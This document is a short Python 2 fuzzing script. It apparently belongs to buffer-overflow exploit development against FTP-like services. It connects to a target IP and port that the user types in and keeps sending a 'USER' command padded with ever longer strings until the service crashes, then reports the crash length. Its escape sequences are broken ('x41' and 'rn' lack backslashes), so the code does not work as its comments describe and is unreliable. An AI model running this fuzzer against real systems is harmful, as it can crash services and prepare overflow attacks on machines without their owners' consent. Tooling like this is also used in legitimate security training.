#!/usr/bin/python

import sys, socket
from time import sleep
 
# set first argument given at CLI to 'target' variable
ip = raw_input("Enter the IP address of the target: ")
port = input("Enter port number: ")
# create string of 50 A's 'x41'
buff = 'x41'*50
 
# loop through sending in a buffer with an increasing length by 50 A's
while True:
  # The "try - except" catches the programs error and takes our defined action
  try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((ip,port))
    s.recv(1024)
 
    print "Sending buffer with length: "+str(len(buff))
    # Send in string 'USER' + the string 'buff'
    s.send("USER "+buff+"rn")
    s.close()
    sleep(1)
    # Increase the buff string by 50 A's and then the loop continues
    buff = buff + 'x41'*50
 
  except: # If we fail to connect to the server, we assume its crashed and print the statement below
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()
